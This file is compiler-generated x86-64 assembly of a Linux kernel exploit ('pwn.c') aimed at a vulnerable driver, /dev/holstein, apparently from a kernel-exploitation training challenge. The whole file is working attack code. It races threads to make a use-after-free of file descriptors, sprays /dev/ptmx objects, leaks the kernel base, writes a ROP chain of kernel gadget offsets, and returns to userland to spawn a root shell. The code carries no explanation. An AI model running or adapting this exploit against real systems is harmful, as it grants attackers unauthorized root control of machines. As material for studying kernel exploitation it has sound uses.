	.file	"pwn.c"
	.text
	.globl	DEBUG_FLAG
	.bss
	.type	DEBUG_FLAG, @object
	.size	DEBUG_FLAG, 1
DEBUG_FLAG:
	.zero	1
	.comm	fd1,4,4
	.comm	fd2,4,4
	.comm	buf,1024,32
	.comm	g_buf_addr,8,8
	.comm	user_cs,8,8
	.comm	user_rflags,8,8
	.comm	user_sp,8,8
	.comm	user_ss,8,8
	.comm	cookie,8,8
	.comm	kbase,8,8
	.comm	offset,8,8
	.comm	tmp_buf,8,8
	.comm	cred_struct,8,8
	.section	.rodata
	.align 8
.LC0:
	.string	"[!] Failed to get root uid, current uid = %d\n"
	.align 8
.LC1:
	.string	"[*] Spawning shell as root uid"
.LC2:
	.string	"/bin/sh"
	.text
	.globl	spawn_shell
	.type	spawn_shell, @function
spawn_shell:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	call	geteuid@PLT
	movl	%eax, -4(%rbp)
	cmpl	$0, -4(%rbp)
	je	.L2
	movl	-4(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC0(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L2:
	leaq	.LC1(%rip), %rdi
	call	puts@PLT
	leaq	.LC2(%rip), %rdi
	call	system@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	spawn_shell, .-spawn_shell
	.globl	ropchain
	.type	ropchain, @function
ropchain:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	leaq	buf(%rip), %rax
	movq	%rax, -16(%rbp)
	movq	$0, -8(%rbp)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	725957(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	468352(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	4784(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	6621515(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	467936(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	kbase(%rip), %rcx
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	8392230(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rdx, %rax
	leaq	spawn_shell(%rip), %rdx
	movq	%rdx, (%rax)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rax, %rdx
	movq	user_cs(%rip), %rax
	movq	%rax, (%rdx)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rax, %rdx
	movq	user_rflags(%rip), %rax
	movq	%rax, (%rdx)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rax, %rdx
	movq	user_sp(%rip), %rax
	movq	%rax, (%rdx)
	movq	-8(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -8(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-16(%rbp), %rax
	addq	%rax, %rdx
	movq	user_ss(%rip), %rax
	movq	%rax, (%rdx)
	movq	kbase(%rip), %rdx
	leaq	1016+buf(%rip), %rax
	addq	$1277352, %rdx
	movq	%rdx, (%rax)
	movl	fd2(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	write@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	ropchain, .-ropchain
	.globl	rop_privesc
	.type	rop_privesc, @function
rop_privesc:
.LFB8:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	call	ropchain
	call	create_overlap
	movl	%eax, -4(%rbp)
	movl	fd2(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	read@PLT
	movq	g_buf_addr(%rip), %rdx
	leaq	24+buf(%rip), %rax
	addq	$920, %rdx
	movq	%rdx, (%rax)
	movl	fd2(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	write@PLT
	movq	g_buf_addr(%rip), %rax
	leaq	-8(%rax), %rdx
	movl	-4(%rbp), %eax
	movl	$3735928559, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE8:
	.size	rop_privesc, .-rop_privesc
	.section	.rodata
.LC3:
	.string	"[D] User state saved\n"
	.text
	.globl	save_user_state
	.type	save_user_state, @function
save_user_state:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 113 "pwn.c" 1
	.intel_syntax noprefix;mov user_cs, cs;mov user_sp, rsp;mov user_ss, ss;pushf;pop user_rflags;.att_syntax;
# 0 "" 2
#NO_APP
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L7
	movq	stderr(%rip), %rax
	movq	%rax, %rcx
	movl	$21, %edx
	movl	$1, %esi
	leaq	.LC3(%rip), %rdi
	call	fwrite@PLT
.L7:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	save_user_state, .-save_user_state
	.globl	race_win
	.bss
	.type	race_win, @object
	.size	race_win, 1
race_win:
	.zero	1
	.text
	.globl	_gettid
	.type	_gettid, @function
_gettid:
.LFB10:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$186, %edi
	movl	$0, %eax
	call	syscall@PLT
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE10:
	.size	_gettid, .-_gettid
	.section	.rodata
.LC4:
	.string	"[!] sched_setaffinity"
.LC5:
	.string	"/dev/holstein"
.LC6:
	.string	"A"
	.text
	.globl	race
	.type	race, @function
race:
.LFB11:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%rdi, -24(%rbp)
	movq	-24(%rbp), %rax
	movq	%rax, -8(%rbp)
	call	_gettid
	movl	%eax, %ecx
	movq	-8(%rbp), %rax
	movq	%rax, %rdx
	movl	$128, %esi
	movl	%ecx, %edi
	call	sched_setaffinity@PLT
	testl	%eax, %eax
	je	.L12
	leaq	.LC4(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L14:
	movl	$2, %esi
	leaq	.LC5(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -12(%rbp)
	movl	fd2(%rip), %eax
	cmpl	%eax, -12(%rbp)
	jne	.L13
	movb	$1, race_win(%rip)
.L13:
	movzbl	race_win(%rip), %eax
	testb	%al, %al
	jne	.L12
	cmpl	$-1, -12(%rbp)
	je	.L12
	movl	-12(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
.L12:
	movzbl	race_win(%rip), %eax
	testb	%al, %al
	je	.L14
	movl	fd1(%rip), %eax
	movl	$1, %edx
	leaq	.LC6(%rip), %rsi
	movl	%eax, %edi
	call	write@PLT
	cmpq	$1, %rax
	jne	.L15
	movl	fd2(%rip), %eax
	movl	$1, %edx
	leaq	.LC6(%rip), %rsi
	movl	%eax, %edi
	call	write@PLT
	cmpq	$1, %rax
	je	.L16
.L15:
	movl	fd1(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	fd2(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movb	$0, race_win(%rip)
	movl	$1000, %edi
	call	usleep@PLT
	jmp	.L12
.L16:
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE11:
	.size	race, .-race
	.section	.rodata
.LC7:
	.string	"/dev/ptmx"
	.text
	.globl	spray_thread
	.type	spray_thread, @function
spray_thread:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$4096, %rsp
	orq	$0, (%rsp)
	subq	$80, %rsp
	movq	%rdi, -4168(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	-4168(%rbp), %rax
	movq	%rax, -4120(%rbp)
	call	_gettid
	movl	%eax, %ecx
	movq	-4120(%rbp), %rax
	movq	%rax, %rdx
	movl	$128, %esi
	movl	%ecx, %edi
	call	sched_setaffinity@PLT
	testl	%eax, %eax
	je	.L19
	leaq	.LC4(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L19:
	movq	$0, -4144(%rbp)
	jmp	.L20
.L25:
	movl	$10, %edi
	call	usleep@PLT
	movl	$256, %esi
	leaq	.LC7(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movslq	%eax, %rdx
	movq	-4144(%rbp), %rax
	movq	%rdx, -4112(%rbp,%rax,8)
	movl	fd2(%rip), %eax
	leaq	-4148(%rbp), %rcx
	movl	$4, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	cmpq	$4, %rax
	jne	.L21
	movl	-4148(%rbp), %eax
	cmpl	$21505, %eax
	jne	.L21
	movq	$0, -4136(%rbp)
	jmp	.L22
.L23:
	movq	-4136(%rbp), %rax
	movq	-4112(%rbp,%rax,8), %rax
	movl	%eax, %edi
	call	close@PLT
	addq	$1, -4136(%rbp)
.L22:
	movq	-4136(%rbp), %rax
	cmpq	-4144(%rbp), %rax
	jb	.L23
	movq	-4144(%rbp), %rax
	movq	-4112(%rbp,%rax,8), %rax
	jmp	.L28
.L21:
	addq	$1, -4144(%rbp)
.L20:
	cmpq	$511, -4144(%rbp)
	jbe	.L25
	movq	$0, -4128(%rbp)
	jmp	.L26
.L27:
	movq	-4128(%rbp), %rax
	movq	-4112(%rbp,%rax,8), %rax
	movl	%eax, %edi
	call	close@PLT
	addq	$1, -4128(%rbp)
.L26:
	cmpq	$511, -4128(%rbp)
	jbe	.L27
	movq	$-1, %rax
.L28:
	movq	-8(%rbp), %rsi
	xorq	%fs:40, %rsi
	je	.L29
	call	__stack_chk_fail@PLT
.L29:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	spray_thread, .-spray_thread
	.section	.rodata
.LC8:
	.string	"/tmp"
.LC9:
	.string	"[*] next fds: %d, %d\n"
.LC10:
	.string	"[!] Unluck"
.LC11:
	.string	"[*] won the race"
	.align 8
.LC12:
	.string	"[*] spraying on another CPU..."
	.align 8
.LC13:
	.string	"[*] overlap OK: victim_fd = %ld\n"
	.text
	.globl	create_overlap
	.type	create_overlap, @function
create_overlap:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$352, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	$0, -32(%rbp)
	movq	$0, -24(%rbp)
	leaq	-304(%rbp), %rax
	movq	%rax, %rsi
	movl	$0, %eax
	movl	$16, %edx
	movq	%rsi, %rdi
	movq	%rdx, %rcx
	rep stosq
	leaq	-176(%rbp), %rax
	movq	%rax, %rsi
	movl	$0, %eax
	movl	$16, %edx
	movq	%rsi, %rdi
	movq	%rdx, %rcx
	rep stosq
	movq	$0, -320(%rbp)
	cmpq	$1023, -320(%rbp)
	ja	.L32
	movq	-320(%rbp), %rax
	shrq	$6, %rax
	leaq	0(,%rax,8), %rdx
	leaq	-304(%rbp), %rcx
	addq	%rcx, %rdx
	movq	(%rdx), %rdx
	movq	-320(%rbp), %rcx
	andl	$63, %ecx
	movl	$1, %esi
	salq	%cl, %rsi
	movq	%rsi, %rcx
	leaq	0(,%rax,8), %rsi
	leaq	-304(%rbp), %rax
	addq	%rsi, %rax
	orq	%rcx, %rdx
	movq	%rdx, (%rax)
.L32:
	movq	$1, -312(%rbp)
	cmpq	$1023, -312(%rbp)
	ja	.L34
	movq	-312(%rbp), %rax
	shrq	$6, %rax
	leaq	0(,%rax,8), %rdx
	leaq	-176(%rbp), %rcx
	addq	%rcx, %rdx
	movq	(%rdx), %rdx
	movq	-312(%rbp), %rcx
	andl	$63, %ecx
	movl	$1, %esi
	salq	%cl, %rsi
	movq	%rsi, %rcx
	leaq	0(,%rax,8), %rsi
	leaq	-176(%rbp), %rax
	addq	%rsi, %rax
	orq	%rcx, %rdx
	movq	%rdx, (%rax)
.L34:
	movl	$0, %esi
	leaq	.LC8(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, fd1(%rip)
	movl	$0, %esi
	leaq	.LC8(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, fd2(%rip)
	movl	fd1(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	fd2(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	fd2(%rip), %edx
	movl	fd1(%rip), %eax
	movl	%eax, %esi
	leaq	.LC9(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	-304(%rbp), %rdx
	leaq	-344(%rbp), %rax
	movq	%rdx, %rcx
	leaq	race(%rip), %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	leaq	-176(%rbp), %rdx
	leaq	-336(%rbp), %rax
	movq	%rdx, %rcx
	leaq	race(%rip), %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	movq	-344(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_join@PLT
	movq	-336(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_join@PLT
	movabsq	$6278066737626506568, %rax
	movq	%rax, -46(%rbp)
	movl	$1684828783, -38(%rbp)
	movw	$33, -34(%rbp)
	movl	fd1(%rip), %eax
	leaq	-46(%rbp), %rcx
	movl	$14, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movl	fd2(%rip), %eax
	leaq	-32(%rbp), %rcx
	movl	$14, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	leaq	-46(%rbp), %rdx
	leaq	-32(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	strcmp@PLT
	testl	%eax, %eax
	je	.L35
	leaq	.LC10(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L35:
	leaq	.LC11(%rip), %rdi
	call	puts@PLT
	leaq	-32(%rbp), %rax
	movl	$14, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	fd1(%rip), %eax
	leaq	-32(%rbp), %rcx
	movl	$16, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movl	fd1(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movq	$-1, -328(%rbp)
	leaq	-304(%rbp), %rax
	movq	%rax, %rdi
	call	spray_thread
	movq	%rax, -328(%rbp)
	jmp	.L36
.L37:
	leaq	.LC12(%rip), %rdi
	call	puts@PLT
	leaq	-176(%rbp), %rdx
	leaq	-344(%rbp), %rax
	movq	%rdx, %rcx
	leaq	spray_thread(%rip), %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	movq	-344(%rbp), %rax
	leaq	-328(%rbp), %rdx
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	pthread_join@PLT
.L36:
	movq	-328(%rbp), %rax
	cmpq	$-1, %rax
	je	.L37
	movq	-328(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC13(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-328(%rbp), %rax
	movq	-8(%rbp), %rdi
	xorq	%fs:40, %rdi
	je	.L39
	call	__stack_chk_fail@PLT
.L39:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	create_overlap, .-create_overlap
	.section	.rodata
.LC14:
	.string	"DEBUG"
.LC15:
	.string	"[*] kbase = 0x%016llx\n"
.LC16:
	.string	"[*] g_buf_addr = 0x%016llx\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	$0, -8(%rbp)
	jmp	.L41
.L44:
	movq	-8(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rax
	leaq	.LC14(%rip), %rsi
	movq	%rax, %rdi
	call	strcmp@PLT
	testl	%eax, %eax
	jne	.L42
	movb	$1, DEBUG_FLAG(%rip)
	jmp	.L43
.L42:
	addq	$1, -8(%rbp)
.L41:
	movl	-20(%rbp), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jb	.L44
.L43:
	movq	stdin(%rip), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	setbuf@PLT
	movq	stdout(%rip), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	setbuf@PLT
	movq	stderr(%rip), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	setbuf@PLT
	call	save_user_state
	call	create_overlap
	movl	fd2(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	read@PLT
	leaq	24+buf(%rip), %rax
	movq	(%rax), %rax
	subq	$12824544, %rax
	movq	%rax, kbase(%rip)
	movq	kbase(%rip), %rax
	andl	$4095, %eax
	testq	%rax, %rax
	je	.L45
	movq	kbase(%rip), %rax
	addq	$288, %rax
	movq	%rax, kbase(%rip)
.L45:
	movq	kbase(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	56+buf(%rip), %rax
	movq	(%rax), %rax
	subq	$56, %rax
	movq	%rax, g_buf_addr(%rip)
	movq	g_buf_addr(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC16(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	call	rop_privesc
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
